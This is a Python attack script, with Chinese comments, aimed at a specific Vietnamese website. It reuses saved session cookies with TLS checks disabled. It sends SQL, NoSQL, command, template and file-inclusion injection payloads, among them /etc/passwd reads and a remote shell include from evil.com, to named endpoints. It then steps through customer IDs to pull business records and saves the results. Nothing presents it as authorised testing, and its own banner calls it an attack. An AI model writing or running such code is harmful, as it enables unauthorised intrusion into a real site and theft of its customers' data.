#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

class UltimateAttack:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.all_findings = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_sqlmap_payloads(self):
        """测试SQLMap payload"""
        print("[*] 测试SQLMap payload...")
        
        sqlmap_payloads = [
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "1' AND updatexml(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1)--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT 1,2--",
            "1' UNION SELECT 'test','test'--",
        ]
        
        endpoint = '/Account/GetUserInfo'
        results = []
        
        for payload in sqlmap_payloads:
            url = f"{self.base_url}{endpoint}?id={urllib.parse.quote(payload)}"
            try:
                start = time.time()
                r = self.session.get(url, timeout=15)
                elapsed = time.time() - start
                
                if elapsed > 4 or 'XPATH' in r.text.upper() or 'version' in r.text.lower():
                    results.append({
                        'payload': payload,
                        'elapsed': elapsed,
                        'status': r.status_code
                    })
                    print(f"    [!] 有效: {payload[:50]}")
            except:
                pass
        
        return results
    
    def test_no_sql_injection(self):
        """测试NoSQL注入"""
        print("[*] 测试NoSQL注入...")
        
        nosql_payloads = [
            {"$ne": "test"},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
        ]
        
        endpoints = [
            '/Handle/SearchListCustomer',
            '/api/users',
        ]
        
        for endpoint in endpoints:
            for payload in nosql_payloads:
                try:
                    r = self.session.post(f"{self.base_url}{endpoint}", json=payload, timeout=10)
                    if r.status_code == 200 and len(r.text) > 100:
                        print(f"    [!] NoSQL可能: {endpoint}")
                except:
                    pass
    
    def test_command_injection(self):
        """测试命令注入"""
        print("[*] 测试命令注入...")
        
        cmd_payloads = [
            "; whoami",
            "| whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",
            "'; whoami; #",
        ]
        
        endpoints = [
            '/Handle/SearchListCustomer',
            '/api/exec',
        ]
        
        for endpoint in endpoints:
            for payload in cmd_payloads:
                url = f"{self.base_url}{endpoint}?q={urllib.parse.quote(payload)}"
                try:
                    r = self.session.get(url, timeout=10)
                    if 'root' in r.text.lower() or 'ubuntu' in r.text.lower():
                        print(f"    [!] 命令注入: {endpoint}")
                except:
                    pass
    
    def test_template_injection(self):
        """测试模板注入"""
        print("[*] 测试模板注入...")
        
        template_payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
        ]
        
        endpoints = [
            '/Handle/SearchListCustomer',
            '/api/render',
        ]
        
        for endpoint in endpoints:
            for payload in template_payloads:
                url = f"{self.base_url}{endpoint}?q={urllib.parse.quote(payload)}"
                try:
                    r = self.session.get(url, timeout=10)
                    if '49' in r.text and len(r.text) < 100:
                        print(f"    [!] 模板注入: {endpoint}")
                except:
                    pass
    
    def test_lfi_rfi(self):
        """测试LFI/RFI"""
        print("[*] 测试LFI/RFI...")
        
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//etc/passwd",
            "/etc/passwd",
            "file:///etc/passwd",
            "http://evil.com/shell.php",
        ]
        
        endpoints = [
            '/File/Download',
            '/Download',
            '/Include',
        ]
        
        for endpoint in endpoints:
            for payload in lfi_payloads:
                url = f"{self.base_url}{endpoint}?file={urllib.parse.quote(payload)}"
                try:
                    r = self.session.get(url, timeout=10)
                    if 'root:' in r.text or '<?php' in r.text:
                        print(f"    [!] LFI/RFI: {endpoint}")
                except:
                    pass
    
    def test_all_known_cves(self):
        """测试已知CVE"""
        print("[*] 测试已知CVE...")
        
        # .NET相关CVE
        cve_tests = [
            ('/Account/GetUserInfo', {'id': "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--"}),
        ]
        
        for endpoint, params in cve_tests:
            url = f"{self.base_url}{endpoint}"
            query = "&".join([f"{k}={urllib.parse.quote(str(v))}" for k, v in params.items()])
            test_url = f"{url}?{query}"
            try:
                r = self.session.get(test_url, timeout=10)
                if 'XPATH' in r.text.upper():
                    print(f"    [!] CVE测试有效: {endpoint}")
            except:
                pass
    
    def extract_all_business_data(self):
        """提取所有业务数据"""
        print("[*] 提取所有业务数据...")
        
        # 已知用户ID=4125，尝试提取相关数据
        business_data = {}
        
        # 尝试提取订单、客户等数据
        test_ids = [4125, 4124, 4126, 1, 2, 999999]
        
        for uid in test_ids:
            test_endpoints = [
                f'/Handle/SearchListCustomer?CustomerID={uid}',
                f'/Handle/SearchListCustomer?ID={uid}',
                f'/Handle/SearchListCustomer?user_id={uid}',
            ]
            
            for endpoint in test_endpoints:
                url = f"{self.base_url}{endpoint}"
                try:
                    r = self.session.get(url, timeout=10)
                    if r.status_code == 200 and len(r.text) > 10:
                        try:
                            data = json.loads(r.text)
                            if isinstance(data, list) and len(data) > 0:
                                business_data[endpoint] = data
                                print(f"    [+] 业务数据: {endpoint} - {len(data)} 条")
                        except:
                            pass
                except:
                    pass
        
        return business_data
    
    def run_all(self):
        """执行所有攻击"""
        print("="*60)
        print("终极攻击测试")
        print("="*60)
        
        self.test_sqlmap_payloads()
        self.test_no_sql_injection()
        self.test_command_injection()
        self.test_template_injection()
        self.test_lfi_rfi()
        self.test_all_known_cves()
        business_data = self.extract_all_business_data()
        
        self.all_findings['business_data'] = business_data
        
        # 保存结果
        with open('ultimate_attack_results.json', 'w', encoding='utf-8') as f:
            json.dump(self.all_findings, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 攻击完成")

if __name__ == "__main__":
    attack = UltimateAttack()
    attack.run_all()